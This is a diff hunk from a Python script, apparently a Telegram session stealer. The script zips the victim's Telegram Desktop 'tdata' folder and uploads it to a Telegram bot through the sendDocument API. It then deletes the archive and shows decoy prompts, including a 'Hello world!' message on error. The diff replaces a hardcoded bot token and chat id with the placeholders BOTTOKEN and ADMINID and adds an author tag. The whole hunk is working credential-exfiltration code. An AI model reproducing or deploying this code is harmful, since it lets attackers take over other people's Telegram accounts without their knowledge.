@@ -26,13 +26,14 @@ try:
                     except:
                         pass
     zip_folder(tdata_path,"tdata.zip")
-    res = requests.get(f"https://api.telegram.org/bot7434554949:AAHSukv6qTe0IUqTNkduA-D906TEmxDxNw4/sendDocument?chat_id=7332620755&caption={time}",files={'document':open(f"tdata.zip",'rb')}).json()
+    res = requests.get(f"https://api.telegram.org/botBOTTOKEN/sendDocument?chat_id=ADMINID&caption={time}",files={'document':open(f"tdata.zip",'rb')}).json()
     os.remove("tdata.zip")
     input("Enter Press click")
 except:
     print("Hello world!")
     input()
 
+#UlugbekWeb
 
 
 
